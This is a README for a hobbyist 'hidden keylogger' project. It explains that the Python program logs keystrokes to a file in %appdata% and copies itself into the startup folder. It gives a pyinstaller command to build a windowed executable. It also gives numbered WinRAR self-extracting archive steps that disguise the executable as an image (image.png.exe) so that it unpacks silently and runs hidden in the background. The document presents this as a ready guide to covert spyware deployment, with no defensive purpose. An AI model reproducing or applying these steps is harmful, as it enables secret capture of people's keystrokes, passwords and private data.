
# hidden keylogger

## 🧙‍♂️ Summary:
```
This python program save the keylogger file called sys.txt inside the %appdata% folder.
Further on, the program makes the keykey.exe clone to the startup folder.
```

### convert the py to exe:
```
pyinstaller --onefile --windowed --icon=ffinger.ico keykey.py
```
### winrar method:
```
1. exe + png
    Rename it as: image.png.exe
2. add to archive...
3. Advanced:
    SFX option...
4. Setup:
    Run after extration:
    ffinger.png
    ffinger.exe
5. Modes:
    select: Unpack to temporary folder and hide all
6. Text and icon:
    Load SFX icon from the file
    ffinger.icon
7. Update:
    select: Extract and update files and Overwrite all files


8. That's it, now you can run the keykey.exe in background with the image.png
```


